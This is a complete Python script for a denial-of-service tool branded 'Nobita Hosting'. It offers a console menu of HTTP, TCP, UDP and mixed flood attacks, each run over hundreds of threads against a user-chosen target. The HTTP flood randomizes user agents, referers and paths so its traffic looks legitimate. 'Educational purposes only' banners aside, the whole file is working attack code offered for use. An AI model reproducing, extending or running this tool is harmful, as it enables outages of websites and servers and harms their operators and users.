import os
import requests
import socket
import threading
import random
import time
import json
import ssl
import struct
import ipaddress
import sys
from urllib.parse import urlparse, urlencode
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

########################################
#       Educational purpose only       #
#           NOBITA HOSTING             #
########################################

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")

# ASCII Art Banner
def print_banner():
    banner = f"""
{Fore.CYAN}
╔╦╗╔═╗╔╗╔╔╦╗╦╔═╗╔╦╗  Ⓗⓞⓢⓣⓘⓝⓖ  ╦╔═╗╔═╗╦╔╗╔╔═╗╔═╗
 ║ ║ ║║║║ ║║║║╣  ║   Ⓝⓞⓑⓘⓣⓐ  ║╠═╝║ ║║║║║║╣ ╚═╗
 ╩ ╚═╝╝╚╝═╩╝╩╚═╝ ╩       ╩╚  ╚═╝╩╝╚╝╚═╝╚═╝
{Fore.YELLOW}
   ⚡ Power Full DDoS Testing Tool ⚡
{Fore.RED}
   ⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️
{Style.RESET_ALL}
"""
    print(banner)

class NobitaHostingDDoSTool:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59"
        ]
        self.referers = [
            "https://www.google.com/",
            "https://www.facebook.com/",
            "https://www.youtube.com/",
            "https://www.amazon.com/",
            "https://www.twitter.com/",
            "https://www.instagram.com/",
            "https://www.linkedin.com/",
            "https://www.reddit.com/"
        ]
        self.is_attacking = False
        self.attack_threads = []
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.start_time = 0
        
    def random_user_agent(self):
        return random.choice(self.user_agents)
    
    def random_referer(self):
        return random.choice(self.referers)
    
    def random_ip(self):
        return ".".join(str(random.randint(0, 255)) for _ in range(4))
    
    def random_string(self, length=10):
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
    
    def genstr(self, size):
        out_str = ''
        for _ in range(0, size):
            code = random.randint(65, 90)
            out_str += chr(code)
        return out_str
    
    def print_stats(self):
        """Print real-time attack statistics"""
        elapsed = time.time() - self.start_time
        rps = self.request_count / elapsed if elapsed > 0 else 0
        success_rate = (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
        
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════╗")
        print(f"║               NOBITA HOSTING STATS               ║")
        print(f"╠══════════════════════════════════════════════════╣")
        print(f"║ {Fore.CYAN}Requests: {Fore.WHITE}{self.request_count:>10} {Fore.CYAN}Success: {Fore.WHITE}{self.success_count:>10} {Fore.CYAN}Failed: {Fore.WHITE}{self.failed_count:>8} ║")
        print(f"║ {Fore.CYAN}RPS: {Fore.WHITE}{rps:>15.2f} {Fore.CYAN}Success Rate: {Fore.WHITE}{success_rate:>8.2f}% {Fore.CYAN}Time: {Fore.WHITE}{elapsed:>8.1f}s ║")
        print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    def http_flood_attack(self, target_url, num_threads=100, duration=0, delay=0):
        """HTTP Flood Attack - Enhanced Version"""
        self.is_attacking = True
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.start_time = time.time()
        
        print(f"{Fore.YELLOW}[NOBITA] Starting HTTP Flood attack on {target_url}")
        print(f"{Fore.YELLOW}[NOBITA] Threads: {num_threads}, Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
        
        def attack():
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                try:
                    headers = {
                        'User-Agent': self.random_user_agent(),
                        'Referer': self.random_referer(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache'
                    }
                    
                    # Randomize the request
                    parsed_url = urlparse(target_url)
                    random_path = f"/{self.random_string(random.randint(3, 10))}"
                    random_param = f"?{self.random_string(5)}={random.randint(1000, 9999)}"
                    
                    attack_url = f"{parsed_url.scheme}://{parsed_url.netloc}{random_path}{random_param}"
                    
                    response = requests.get(attack_url, headers=headers, timeout=10, allow_redirects=True)
                    
                    with threading.Lock():
                        self.request_count += 1
                        if response.status_code < 400:
                            self.success_count += 1
                        else:
                            self.failed_count += 1
                    
                    if delay > 0:
                        time.sleep(delay)
                        
                except Exception as e:
                    with threading.Lock():
                        self.request_count += 1
                        self.failed_count += 1
                    if delay > 0:
                        time.sleep(delay)
        
        # Create attack threads
        for i in range(num_threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        try:
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                self.print_stats()
                time.sleep(2)
        except KeyboardInterrupt:
            self.is_attacking = False
        
        print(f"{Fore.GREEN}[NOBITA] HTTP Flood attack completed")
        return self.request_count, self.success_count, self.failed_count
    
    def tcp_flood_attack(self, target, port=80, num_threads=200, duration=0, packet_size=1024):
        """TCP Flood Attack - Enhanced Version"""
        self.is_attacking = True
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.start_time = time.time()
        
        print(f"{Fore.YELLOW}[NOBITA] Starting TCP Flood attack on {target}:{port}")
        print(f"{Fore.YELLOW}[NOBITA] Threads: {num_threads}, Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
        
        def attack():
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((target, port))
                    
                    # Send multiple packets
                    for _ in range(random.randint(1, 5)):
                        payload = random._urandom(packet_size)
                        s.send(payload)
                        time.sleep(0.1)
                    
                    s.close()
                    
                    with threading.Lock():
                        self.request_count += 1
                        self.success_count += 1
                        
                except Exception as e:
                    with threading.Lock():
                        self.request_count += 1
                        self.failed_count += 1
        
        # Create attack threads
        for i in range(num_threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        try:
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                self.print_stats()
                time.sleep(2)
        except KeyboardInterrupt:
            self.is_attacking = False
        
        print(f"{Fore.GREEN}[NOBITA] TCP Flood attack completed")
        return self.request_count, self.success_count, self.failed_count
    
    def udp_flood_attack(self, target, port=80, num_threads=100, duration=0, packet_size=1450):
        """UDP Flood Attack - Enhanced Version"""
        self.is_attacking = True
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.start_time = time.time()
        
        print(f"{Fore.YELLOW}[NOBITA] Starting UDP Flood attack on {target}:{port}")
        print(f"{Fore.YELLOW}[NOBITA] Threads: {num_threads}, Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
        
        def attack():
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Send multiple packets
                    for _ in range(random.randint(1, 10)):
                        payload = random._urandom(packet_size)
                        s.sendto(payload, (target, port))
                    
                    s.close()
                    
                    with threading.Lock():
                        self.request_count += 10  # Count each batch as 10 requests
                        self.success_count += 10
                        
                except Exception as e:
                    with threading.Lock():
                        self.request_count += 10
                        self.failed_count += 10
        
        # Create attack threads
        for i in range(num_threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        try:
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                self.print_stats()
                time.sleep(2)
        except KeyboardInterrupt:
            self.is_attacking = False
        
        print(f"{Fore.GREEN}[NOBITA] UDP Flood attack completed")
        return self.request_count, self.success_count, self.failed_count
    
    def mixed_attack(self, target, port=80, num_threads=150, duration=0):
        """Mixed Attack - HTTP, TCP, and UDP combined"""
        self.is_attacking = True
        self.request_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.start_time = time.time()
        
        print(f"{Fore.YELLOW}[NOBITA] Starting MIXED attack on {target}")
        print(f"{Fore.YELLOW}[NOBITA] Threads: {num_threads}, Duration: {'Unlimited' if duration == 0 else f'{duration} seconds'}")
        
        def http_attack():
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                try:
                    headers = {'User-Agent': self.random_user_agent()}
                    response = requests.get(f"http://{target}:{port}", headers=headers, timeout=5)
                    
                    with threading.Lock():
                        self.request_count += 1
                        if response.status_code < 400:
                            self.success_count += 1
                        else:
                            self.failed_count += 1
                except:
                    with threading.Lock():
                        self.request_count += 1
                        self.failed_count += 1
        
        def tcp_attack():
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target, port))
                    s.send(random._urandom(1024))
                    s.close()
                    
                    with threading.Lock():
                        self.request_count += 1
                        self.success_count += 1
                except:
                    with threading.Lock():
                        self.request_count += 1
                        self.failed_count += 1
        
        def udp_attack():
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(random._urandom(1024), (target, port))
                    s.close()
                    
                    with threading.Lock():
                        self.request_count += 1
                        self.success_count += 1
                except:
                    with threading.Lock():
                        self.request_count += 1
                        self.failed_count += 1
        
        # Create attack threads (distributed among different attack types)
        for i in range(num_threads // 3):
            t = threading.Thread(target=http_attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
            
            t = threading.Thread(target=tcp_attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
            
            t = threading.Thread(target=udp_attack)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        # Monitor attack progress
        try:
            while self.is_attacking and (duration == 0 or time.time() - self.start_time < duration):
                self.print_stats()
                time.sleep(2)
        except KeyboardInterrupt:
            self.is_attacking = False
        
        print(f"{Fore.GREEN}[NOBITA] Mixed attack completed")
        return self.request_count, self.success_count, self.failed_count
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        self.is_attacking = False
        for t in self.attack_threads:
            t.join(timeout=1)
        self.attack_threads = []
        print(f"{Fore.RED}[NOBITA] All attacks stopped")

def main():
    tool = NobitaHostingDDoSTool()
    print_banner()
    
    while True:
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════╗")
        print(f"║             NOBITA HOSTING - MAIN MENU             ║")
        print(f"╠══════════════════════════════════════════════════╣")
        print(f"║ {Fore.YELLOW}1.{Fore.WHITE} HTTP Flood Attack                         ║")
        print(f"║ {Fore.YELLOW}2.{Fore.WHITE} TCP Flood Attack                          ║")
        print(f"║ {Fore.YELLOW}3.{Fore.WHITE} UDP Flood Attack                          ║")
        print(f"║ {Fore.YELLOW}4.{Fore.WHITE} Mixed Attack (All Methods)                ║")
        print(f"║ {Fore.YELLOW}5.{Fore.WHITE} Stop All Attacks                          ║")
        print(f"║ {Fore.YELLOW}6.{Fore.WHITE} Exit                                      ║")
        print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        choice = input(f"{Fore.GREEN}[NOBITA] Select an option (1-6): {Style.RESET_ALL}")
        
        if choice == '1':
            target = input(f"{Fore.GREEN}[NOBITA] Enter target URL/IP: {Style.RESET_ALL}")
            threads = int(input(f"{Fore.GREEN}[NOBITA] Number of threads (default: 100): {Style.RESET_ALL}") or "100")
            duration = int(input(f"{Fore.GREEN}[NOBITA] Duration in seconds (0 for unlimited): {Style.RESET_ALL}") or "0")
            tool.http_flood_attack(target, threads, duration)
        
        elif choice == '2':
            target = input(f"{Fore.GREEN}[NOBITA] Enter target IP: {Style.RESET_ALL}")
            port = int(input(f"{Fore.GREEN}[NOBITA] Enter port (default: 80): {Style.RESET_ALL}") or "80")
            threads = int(input(f"{Fore.GREEN}[NOBITA] Number of threads (default: 200): {Style.RESET_ALL}") or "200")
            duration = int(input(f"{Fore.GREEN}[NOBITA] Duration in seconds (0 for unlimited): {Style.RESET_ALL}") or "0")
            tool.tcp_flood_attack(target, port, threads, duration)
        
        elif choice == '3':
            target = input(f"{Fore.GREEN}[NOBITA] Enter target IP: {Style.RESET_ALL}")
            port = int(input(f"{Fore.GREEN}[NOBITA] Enter port (default: 80): {Style.RESET_ALL}") or "80")
            threads = int(input(f"{Fore.GREEN}[NOBITA] Number of threads (default: 100): {Style.RESET_ALL}") or "100")
            duration = int(input(f"{Fore.GREEN}[NOBITA] Duration in seconds (0 for unlimited): {Style.RESET_ALL}") or "0")
            tool.udp_flood_attack(target, port, threads, duration)
        
        elif choice == '4':
            target = input(f"{Fore.GREEN}[NOBITA] Enter target IP: {Style.RESET_ALL}")
            port = int(input(f"{Fore.GREEN}[NOBITA] Enter port (default: 80): {Style.RESET_ALL}") or "80")
            threads = int(input(f"{Fore.GREEN}[NOBITA] Number of threads (default: 150): {Style.RESET_ALL}") or "150")
            duration = int(input(f"{Fore.GREEN}[NOBITA] Duration in seconds (0 for unlimited): {Style.RESET_ALL}") or "0")
            tool.mixed_attack(target, port, threads, duration)
        
        elif choice == '5':
            tool.stop_all_attacks()
        
        elif choice == '6':
            tool.stop_all_attacks()
            print(f"{Fore.GREEN}[NOBITA] Thank you for using Nobita Hosting Tool!")
            print(f"{Fore.GREEN}[NOBITA] Exiting...")
            break
        
        else:
            print(f"{Fore.RED}[NOBITA] Invalid choice. Please try again.")

if __name__ == "__main__":
    # Warning message
    print(f"{Fore.RED}╔══════════════════════════════════════════════════╗")
    print(f"║                 WARNING! WARNING!                   ║")
    print(f"╠══════════════════════════════════════════════════╣")
    print(f"║ {Fore.YELLOW}This tool is for educational purposes only!     {Fore.RED}║")
    print(f"║ {Fore.YELLOW}Use only on systems you own or have explicit    {Fore.RED}║")
    print(f"║ {Fore.YELLOW}permission to test. Unauthorized use is illegal {Fore.RED}║")
    print(f"║ {Fore.YELLOW}and unethical. You are responsible for your     {Fore.RED}║")
    print(f"║ {Fore.YELLOW}actions.                                        {Fore.RED}║")
    print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    time.sleep(3)  # Give user time to read warning
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[NOBITA] Tool interrupted by user. Exiting...")
    except Exception as e:
        print(f"{Fore.RED}[NOBITA] An error occurred: {e}")
